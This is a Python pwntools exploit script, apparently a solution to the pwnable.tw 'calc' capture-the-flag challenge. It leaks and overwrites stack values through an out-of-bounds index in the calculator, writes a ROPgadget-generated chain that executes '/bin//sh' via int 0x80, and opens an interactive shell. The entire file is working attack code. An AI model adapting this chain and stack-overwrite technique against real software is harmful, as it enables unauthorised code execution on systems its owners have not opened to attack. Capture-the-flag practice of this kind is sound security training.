from pwn import *

e = ELF("./calc")
p = process("./calc")
#p = remote("chall.pwnable.tw",10100)

# leak a value. index is offset from the local variable val[] is stored.
def get_stack(index):
	p.sendline("+"+str(index))
	return int(p.recvline())

# set a value on the stack. op is either + or - (depending on whether the stack value is greater or less than the ropchain element)
def set_stack(index, data, op):
	p.sendline("+"+str(index)+op+str(data))
	p.recvline()

# ropchain generated by ROPgadget
ropchain = [  
0x080701aa, # pop edx ; ret
0x080ec060, # @ .data
0x0805c34b, # pop eax ; ret
0x6e69622f, # '/bin'
0x0809b30d, # mov dword ptr [edx], eax ; ret
0x080701aa, # pop edx ; ret
0x080ec064, # @ .data + 4
0x0805c34b, # pop eax ; ret
0x68732f2f, # '//sh'
0x0809b30d, # mov dword ptr [edx], eax ; ret
0x080701aa, # pop edx ; ret
0x080ec068, # @ .data + 8
0x080550d0, # xor eax, eax ; ret
0x0809b30d, # mov dword ptr [edx], eax ; ret
0x080481d1, # pop ebx ; ret
0x080ec060, # @ .data
0x080701d1, # pop ecx ; pop ebx ; ret
0x080ec068, # @ .data + 8
0x080ec060, # padding without overwrite ebx
0x080701aa, # pop edx ; ret
0x080ec068, # @ .data + 8
0x080550d0, # xor eax, eax ; ret
0x0807cb7f, # inc eax ; ret
0x0807cb7f, # inc eax ; ret
0x0807cb7f, # inc eax ; ret
0x0807cb7f, # inc eax ; ret
0x0807cb7f, # inc eax ; ret
0x0807cb7f, # inc eax ; ret
0x0807cb7f, # inc eax ; ret
0x0807cb7f, # inc eax ; ret
0x0807cb7f, # inc eax ; ret
0x0807cb7f, # inc eax ; ret
0x0807cb7f, # inc eax ; ret
0x08049a21] # int 0x80

# Exploit begins here
p.recvline()  # Ignore the welcome message
for i in range(len(ropchain)):  # Build the ropchain.
	stack_val = get_stack(361+i)
	if stack_val > ropchain[i]:
		set_stack(361+i, stack_val - ropchain[i], "-")	
	else:
		set_stack(361+i, ropchain[i] - stack_val, "+")
p.sendline("\n")  # send a newline to return from calc()
p.interactive()
